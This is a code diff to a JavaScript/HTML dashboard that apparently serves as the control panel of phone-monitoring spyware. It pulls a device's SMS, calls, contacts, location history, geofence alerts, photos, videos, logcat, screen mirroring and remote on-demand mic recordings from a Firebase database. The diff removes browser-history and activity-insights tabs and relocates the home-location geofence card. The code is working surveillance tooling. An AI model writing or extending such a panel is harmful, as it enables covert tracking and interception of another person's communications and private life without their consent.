@@ -281,13 +281,10 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <button class="tab-btn" data-tab="timeline">&#x1F4AC; Timeline</button>
 <button class="tab-btn" data-tab="calls">&#x1F4DE; Calls</button>
 <button class="tab-btn" data-tab="apps">&#x1F4CA; Apps</button>
-<button class="tab-btn" data-tab="geofence">&#x2699; Geo</button>
 <button class="tab-btn" data-tab="contacts">&#x1F4CD; Contacts</button>
 <button class="tab-btn" data-tab="voice">&#x1F3A4; Voice</button>
 <button class="tab-btn" data-tab="remote">&#x1F3A4; Remote</button>
-<button class="tab-btn" data-tab="insights">&#x1F4CA; Insights</button>
 <button class="tab-btn" data-tab="storage">&#x1F4E6; Storage</button>
-<button class="tab-btn" data-tab="browser">&#x1F310; Browser</button>
 <button class="tab-btn" data-tab="permissions">&#x1F512; Perms</button>
 <button class="tab-btn" data-tab="wifi">&#x1F4E1; WiFi</button>
 <button class="tab-btn" data-tab="logcat">&#x1F4DD; Logcat</button>
@@ -355,6 +352,23 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
     <span style="font-size:13px;color:var(--muted)">pending entries</span>
   </div>
 </div>
+<div class="card" style="border-left-color:var(--accent);padding:12px;margin-top:8px">
+  <div style="font-size:15px;font-weight:500;margin-bottom:6px">&#x1F3E0; Home Location</div>
+  <div id="homeInfo" style="font-size:13px;color:var(--muted);margin-bottom:6px">--</div>
+  <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:6px">
+    <button class="chip" id="setHomeBtn" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:13px">&#x1F4CD; Set current as Home</button>
+    <button class="chip" id="removeHomeBtn" style="border-color:var(--danger);color:var(--danger);font-size:13px">Remove Home</button>
+  </div>
+  <div id="homeRadiusRow" style="display:none;font-size:13px;color:var(--muted)">
+    <label>Radius: <input type="range" min="100" max="3000" step="100" value="1000" id="homeRadiusRange" style="width:120px;vertical-align:middle;accent-color:var(--accent)"> <span id="homeRadiusVal">1000m</span></label>
+    <div style="font-size:12px;color:var(--muted)">Drag the &#x1F3E0; marker on the map to move home.</div>
+  </div>
+</div>
+<div id="geofenceList"></div>
+<div style="margin-top:12px;border-top:1px solid var(--border);padding-top:10px">
+<div style="font-size:15px;font-weight:500;margin-bottom:6px">&#x1F514; Alert History</div>
+<div id="geofenceAlertLog" style="max-height:200px;overflow-y:auto;font-size:12px;color:var(--muted)"><div class="label">No alerts yet</div></div>
+</div>
 </div>
 <div id="tab-recents">
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
@@ -381,22 +395,6 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 </div>
 <div id="recentsList"><div class="label">Click Refresh to load app snapshots</div></div>
 <div id="recentsSentinel"></div>
-</div>
-<div id="tab-browser">
-<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-  <span style="font-size:14px;font-weight:500">&#x1F310; Browser History</span>
-  <span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="pollBrowserHistory()">&#x1F504; Refresh</span>
-</div>
-<div class="filter-chips" id="browserChips" style="margin-bottom:6px">
-  <span class="chip active" data-browser="all">All</span>
-  <span class="chip" data-browser="chrome">Chrome</span>
-  <span class="chip" data-browser="firefox">Firefox</span>
-  <span class="chip" data-browser="samsung">Samsung</span>
-  <span class="chip" data-browser="huawei">Huawei</span>
-  <span class="chip" data-browser="other">Other</span>
-</div>
-<input type="text" id="browserSearch" placeholder="&#x1F50D; Search titles, URLs..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:6px;font-size:12px;margin-bottom:8px">
-<div id="browserList"><div class="empty-msg">No browsing history yet</div></div>
 </div>
 <div id="tab-photos">
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
@@ -505,25 +503,6 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
   <div id="appsLegacyDebug" style="display:none"></div>
   <div id="appsSnapDebug" style="display:none"></div>
 </div>
-<div id="tab-geofence">
-<div class="card" style="border-left-color:var(--accent);padding:12px;margin-bottom:10px">
-  <div style="font-size:15px;font-weight:500;margin-bottom:6px">&#x1F3E0; Home Location</div>
-  <div id="homeInfo" style="font-size:13px;color:var(--muted);margin-bottom:6px">--</div>
-  <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:6px">
-    <button class="chip" id="setHomeBtn" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:13px">&#x1F4CD; Set current as Home</button>
-    <button class="chip" id="removeHomeBtn" style="border-color:var(--danger);color:var(--danger);font-size:13px">Remove Home</button>
-  </div>
-  <div id="homeRadiusRow" style="display:none;font-size:13px;color:var(--muted)">
-    <label>Radius: <input type="range" min="100" max="3000" step="100" value="1000" id="homeRadiusRange" style="width:120px;vertical-align:middle;accent-color:var(--accent)"> <span id="homeRadiusVal">1000m</span></label>
-    <div style="font-size:12px;color:var(--muted)">Drag the &#x1F3E0; marker on the map to move home.</div>
-  </div>
-</div>
-<div id="geofenceList"></div>
-<div style="margin-top:12px;border-top:1px solid var(--border);padding-top:10px">
-<div style="font-size:15px;font-weight:500;margin-bottom:6px">&#x1F514; Alert History</div>
-<div id="geofenceAlertLog" style="max-height:200px;overflow-y:auto;font-size:12px;color:var(--muted)"><div class="label">No alerts yet</div></div>
-</div>
-</div>
 <div id="tab-contacts">
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
   <span style="font-size:16px;font-weight:500">&#x1F4CD; Contacts</span>
@@ -623,26 +602,6 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 
 <div id="remoteHintBanner" style="display:none;font-size:12px;color:var(--warning);background:var(--card);border:1px solid var(--warning);padding:8px 10px;border-radius:var(--radius);margin-bottom:8px"></div>
 <div id="remoteRecordingsList"><div class="label">No remote recordings yet</div></div>
-</div>
-<div id="tab-insights">
-<div class="grid" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:10px">
-<div><div class="label">&#x1F4CA; Today's Activity</div><div class="value" id="inTodayActivity">--</div></div>
-<div><div class="label">&#x1F4CD; Unique Locations</div><div class="value" id="inUniqueLocs">--</div></div>
-<div><div class="label">&#x1F4DE; Calls Today</div><div class="value" id="inCallsToday">--</div></div>
-</div>
-<div class="card" style="border-left-color:var(--accent)">
-<div class="label">&#x1F504; Location Changes (last 24h)</div>
-<div id="inLocChart" style="height:50px;display:flex;align-items:flex-end;gap:3px;margin-top:6px"></div>
-</div>
-<div class="card" style="border-left-color:var(--accent)">
-<div class="label">&#x1F4CA; Top Contacts</div>
-<div id="inTopContacts" style="margin-top:4px"><span class="label">Load timeline to analyze</span></div>
-</div>
-<div class="card" style="border-left-color:var(--accent)">
-<div class="label">&#x1F4C5; Activity Heatmap (hour of day)</div>
-<div id="inHeatmap" style="display:flex;gap:2px;margin-top:6px;flex-wrap:wrap"></div>
-</div>
-<button class="chip" style="background:var(--accent);color:#000;margin-top:8px" onclick="exportData()">&#x1F4E5; Export Data (CSV)</button>
 </div>
 <div id="tab-storage">
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
@@ -1972,9 +1931,7 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
       }
       renderPlaybackTab();
     }
-    if (btn.dataset.tab === 'insights') renderInsights();
     if (btn.dataset.tab === 'storage') refreshStorage();
-    if (btn.dataset.tab === 'browser') pollBrowserHistory();
     if (btn.dataset.tab === 'permissions') { if (window.permCache) renderPermissions(); else pollPermissions(); }
     if (btn.dataset.tab === 'photos') { renderPhotosFromCache(); pollPhotos(); }
     if (btn.dataset.tab === 'videos') { renderVideosFromCache(); pollVideos(); }
@@ -2722,8 +2679,6 @@ function startPolling() {
   schedulePoll('perms', intervals.perms, pollPermissions);
   schedulePoll('fcm', intervals.fcm, pollFcmToken);
   schedulePoll('queue', 30000, pollQueueSize);
-  schedulePoll('browser', 120000, pollBrowserHistory);
-  schedulePoll('insights', 120000, renderInsights);
   schedulePoll('wifi', 60000, pollWifiScans);
   schedulePoll('logcat', 60000, pollLogcat);
   schedulePoll('health', intervals.health, pollHealth);
@@ -2742,7 +2697,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy()];
+  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -3568,7 +3523,7 @@ async function performGlobalSearch(q) {
   const results = document.getElementById('globalSearchResults');
   results.style.display = 'block';
   results.innerHTML = '<div class="label">Searching...</div>';
-  const queries = ['sms', 'calls', 'contacts', 'notifications', 'photos', 'videos', 'appSnapshots', 'timeline', 'browser', 'logcat', 'permissions'];
+  const queries = ['sms', 'calls', 'contacts', 'notifications', 'photos', 'videos', 'appSnapshots', 'timeline', 'logcat', 'permissions'];
   const device = selectedDevice;
   let allMatches = [];
   for (const key of queries) {
@@ -3593,7 +3548,7 @@ async function performGlobalSearch(q) {
   allMatches.sort((a, b) => b.count - a.count);
   let html = '<div style="margin-bottom:4px;font-size:13px;color:var(--muted)">Found in ' + allMatches.length + ' data types:</div>';
   for (const m of allMatches.slice(0, 20)) {
-    const icons = { sms: '\u{1F4F1}', calls: '\u{1F4DE}', contacts: '\u{1F464}', notifications: '\u{1F514}', photos: '\u{1F5BC}', videos: '\u{1F3AC}', appSnapshots: '\u{1F4CB}', timeline: '\u{1F4CD}', browser: '\u{1F310}', logcat: '\u{1F4DD}', permissions: '\u{1F512}' };
+    const icons = { sms: '\u{1F4F1}', calls: '\u{1F4DE}', contacts: '\u{1F464}', notifications: '\u{1F514}', photos: '\u{1F5BC}', videos: '\u{1F3AC}', appSnapshots: '\u{1F4CB}', timeline: '\u{1F4CD}', logcat: '\u{1F4DD}', permissions: '\u{1F512}' };
     html += '<div class="bar-row" style="padding:6px 10px;cursor:pointer;border-bottom:1px solid var(--border)" onclick="switchTab(\'' + m.key + '\')">' +
       '<span style="margin-right:8px">' + (icons[m.key] || '\u{1F4C1}') + '</span>' +
       '<span style="font-weight:500;flex:1">' + m.key + '</span>' +
@@ -6663,13 +6618,13 @@ document.addEventListener('keydown', e => {
     if (text && text !== '--' && navigator.clipboard) navigator.clipboard.writeText(text).catch(() => {});
   }
   // Single-letter tab shortcuts (no modifier)
-  const letterMap = { h: 'health', p: 'photos', m: 'videos', v: 'voice', l: 'live', s: 'storage', t: 'timeline', a: 'apps', r: 'recents', g: 'geofence', w: 'wifi', b: 'browser', c: 'calls', o: 'contacts' };
+  const letterMap = { h: 'health', p: 'photos', m: 'videos', v: 'voice', l: 'live', s: 'storage', t: 'timeline', a: 'apps', r: 'recents', w: 'wifi', c: 'calls', o: 'contacts' };
   if (!typing && !e.ctrlKey && !e.metaKey && !e.altKey && letterMap[e.key]) {
     e.preventDefault();
     switchTab(letterMap[e.key]);
   }
   // 1-9 for tab switching with Alt
-  const numMap = { '1': 'live', '2': 'timeline', '3': 'recents', '4': 'calls', '5': 'apps', '6': 'photos', '7': 'videos', '8': 'insights', '9': 'storage' };
+  const numMap = { '1': 'live', '2': 'timeline', '3': 'recents', '4': 'calls', '5': 'apps', '6': 'photos', '7': 'videos', '8': 'storage', '9': 'health' };
   if (!typing && e.key >= '1' && e.key <= '9' && e.altKey) {
     e.preventDefault();
     const tab = numMap[e.key];
@@ -6683,90 +6638,6 @@ document.addEventListener('keydown', e => {
     document.getElementById('globalSearch')?.focus();
   }
 });
-
-// --- Insights ---
-async function renderInsights() {
-  if (!selectedDevice) return;
-  try {
-  const [hist, apps, tl] = await Promise.all([
-    fetchRTDB(`devices/${selectedDevice}/location/history`),
-    fetchRTDB(`devices/${selectedDevice}/apps`),
-    fetchRTDB(`devices/${selectedDevice}/timeline`, 'orderBy="$key"&limitToLast=1000')
-  ]);
-  
-  // Location changes per hour (last 24h)
-  const locByHour = new Array(24).fill(0);
-  if (hist && typeof hist === 'object') {
-    const now = Date.now();
-    async function countLocations(obj) {
-      if (!obj || typeof obj !== 'object') return;
-      for (const [k, v] of Object.entries(obj)) {
-        if (v && typeof v === 'object' && !v.lat) {
-          await countLocations(v);
-        } else if (v && v.lat) {
-          const ts = parseInt(k);
-          if (!isNaN(ts) && now - ts < 86400000) {
-            const h = new Date(ts).getHours();
-            locByHour[h]++;
-          }
-        }
-      }
-    }
-    await countLocations(hist);
-  }
-  const locChart = document.getElementById('inLocChart');
-  if (locChart) {
-    const max = Math.max(...locByHour, 1);
-    locChart.innerHTML = locByHour.map((v, h) => 
-      `<div title="${hour12Label(h)} - ${v} changes" style="flex:1;background:var(--border);border-radius:2px;overflow:hidden;height:50px;display:flex;flex-direction:column-reverse">
-        <div style="height:${(v/max*100).toFixed(0)}%;background:var(--accent);border-radius:2px"></div>
-      </div>`
-    ).join('');
-    document.getElementById('inUniqueLocs').textContent = locByHour.filter(v => v > 0).length + ' hrs active';
-  }
-  
-  // Today's activity
-  const todayStr = new Date().toISOString().slice(0,10);
-  const todayLocs = locByHour.reduce((a, b) => a + b, 0);
-  document.getElementById('inTodayActivity').textContent = todayLocs + ' changes';
-
-  // Top contacts from timeline
-  const contactCount = {};
-  if (tl && typeof tl === 'object') {
-    let callsToday = 0;
-    Object.values(tl).forEach(entry => {
-      if (entry.type === 'call' || entry.type === 'incoming' || entry.type === 'outgoing' || entry.type === 'missed') {
-        const num = entry.number || 'unknown';
-        contactCount[num] = (contactCount[num] || 0) + 1;
-        const ts = parseInt(entry.ts_ms);
-        if (!isNaN(ts) && new Date(ts).toISOString().slice(0,10) === todayStr) callsToday++;
-      }
-    });
-    document.getElementById('inCallsToday').textContent = callsToday;
-  }
-  const sortedContacts = Object.entries(contactCount).sort((a, b) => b[1] - a[1]).slice(0, 10);
-  const tcEl = document.getElementById('inTopContacts');
-  if (tcEl) {
-    tcEl.innerHTML = sortedContacts.length
-      ? sortedContacts.map(([num, count]) =>
-          `<div style="display:flex;justify-content:space-between;padding:2px 0;font-size:14px">
-            <span>${escHtml(num)}</span><span style="color:var(--accent)">${count}x</span>
-          </div>`).join('')
-      : '<span class="label">No call data available</span>';
-  }
-
-  // Heatmap overlay
-  const heatEl = document.getElementById('inHeatmap');
-  if (heatEl) {
-    const maxH = Math.max(...locByHour, 1);
-    heatEl.innerHTML = locByHour.map((v, h) => {
-      const pct = (v / maxH * 100);
-      const intensity = pct > 75 ? '#ef4444' : pct > 50 ? '#f97316' : pct > 25 ? '#eab308' : '#6b7280';
-      return `<div title="${hour12Label(h)} - ${v}" style="width:24px;height:24px;background:${intensity};border-radius:3px;display:flex;align-items:center;justify-content:center;font-size:9px;color:${pct > 50 ? '#000' : 'var(--text)'}">${hour12Compact(h)}</div>`;
-    }).join('');
-  }
-  } catch(e) { console.error('renderInsights error:', e); }
-}
 
 // --- Storage & Cleanup ---
 function formatBytes(bytes) {
@@ -7268,98 +7139,6 @@ async function execCleanup(action, path) {
     showAlert(`Cleaned ${deleted} duplicate exercise entries`, deleted > 0 ? 'warn' : 'error');
     return;
   }
-}
-
-// --- Browser History ---
-let browserFilter = 'all';
-document.querySelectorAll('#browserChips .chip').forEach(chip => {
-  chip.addEventListener('click', function() {
-    document.querySelectorAll('#browserChips .chip').forEach(c => c.classList.remove('active'));
-    this.classList.add('active');
-    browserFilter = this.dataset.browser;
-    const cached = document.getElementById('browserList').cachedData;
-    if (cached) renderBrowserHistory(cached);
-  });
-});
-document.getElementById('browserSearch').addEventListener('input', function() {
-  const cached = document.getElementById('browserList').cachedData;
-  if (cached) renderBrowserHistory(cached);
-});
-
-function browserIcon(provider) {
-  const p = (provider || '').toLowerCase();
-  if (p.includes('chrome')) return '\u{1F310}';
-  if (p.includes('firefox')) return '\u{1F98A}';
-  if (p.includes('samsung') || p.includes('sbrowser')) return '\u{1F4F1}';
-  if (p.includes('huawei')) return '\u{1F30D}';
-  if (p.includes('opera')) return '\u{25CE}';
-  if (p.includes('brave')) return '\u{1F99A}';
-  if (p.includes('edge') || p.includes('emmex')) return '\u{1F310}';
-  return '\u{1F5B1}';
-}
-
-function browserGroup(p) {
-  const prov = (p || '').toLowerCase();
-  if (prov.includes('chrome')) return 'chrome';
-  if (prov.includes('firefox')) return 'firefox';
-  if (prov.includes('samsung') || prov.includes('sbrowser')) return 'samsung';
-  if (prov.includes('huawei')) return 'huawei';
-  return 'other';
-}
-
-function renderBrowserHistory(entries) {
-  const list = document.getElementById('browserList');
-  list.cachedData = entries;
-  let filtered = entries;
-  if (browserFilter !== 'all') filtered = filtered.filter(e => browserGroup(e.provider) === browserFilter);
-  const q = document.getElementById('browserSearch').value.toLowerCase();
-  if (q) filtered = filtered.filter(e => (e.title || '').toLowerCase().includes(q) || (e.url || '').toLowerCase().includes(q));
-  if (!filtered.length) { list.innerHTML = '<div class="label">No entries' + (q ? ' matching "' + q + '"' : '') + '</div>'; return; }
-  const groups = {};
-  for (const e of filtered) {
-    const day = new Date(e.dateMs).toLocaleDateString('en-PK', { timeZone: PKT, day: '2-digit', month: 'short', weekday: 'short' });
-    if (!groups[day]) groups[day] = [];
-    groups[day].push(e);
-  }
-  let html = '';
-  for (const [day, entries] of Object.entries(groups)) {
-    html += `<div class="tl-group"><div class="tl-day">${day} <span style="font-weight:400;color:var(--muted)">(${entries.length})</span></div>`;
-    for (const e of entries) {
-      const icon = browserIcon(e.provider);
-      const title = e.title || '(no title)';
-      const url = e.url ? (e.url.length > 80 ? e.url.slice(0, 80) + '...' : e.url) : '';
-      const visits = e.visits > 1 ? ` \u2022 ${e.visits} visits` : '';
-      const time = e.dateMs ? pktShort(e.dateMs) : '';
-      html += `<div class="card" style="padding:8px 12px;margin-bottom:4px">
-        <div class="time">${icon} ${time}${visits}</div>
-        <div style="font-size:14px;font-weight:500">${escHtml(title)}</div>
-        <div style="font-size:12px;color:var(--muted);word-break:break-all">${escHtml(url)}</div>
-      </div>`;
-    }
-    html += '</div>';
-  }
-  list.innerHTML = html;
-}
-
-async function pollBrowserHistory() {
-  if (!selectedDevice) return;
-  const list = document.getElementById('browserList');
-  list.innerHTML = '<div class="label" style="color:var(--accent)">Loading browsing history...</div>';
-  try {
-    const data = await fetchRTDB(`devices/${selectedDevice}/browser_history`);
-    if (!data || typeof data !== 'object') { list.innerHTML = '<div class="empty-msg">No browsing history yet</div>'; return; }
-    const all = [];
-    for (const batch of Object.values(data)) {
-      if (batch && batch.history && Array.isArray(batch.history)) {
-        for (const entry of batch.history) {
-          if (entry && entry.url) all.push(entry);
-        }
-      }
-    }
-    all.sort((a, b) => (b.dateMs || 0) - (a.dateMs || 0));
-    if (!all.length) { list.innerHTML = '<div class="empty-msg">No browsing history yet</div>'; return; }
-    renderBrowserHistory(all);
-  } catch { list.innerHTML = '<div class="label" style="color:var(--danger)">Failed to load history</div>'; }
 }
 
 // --- Data Export ---
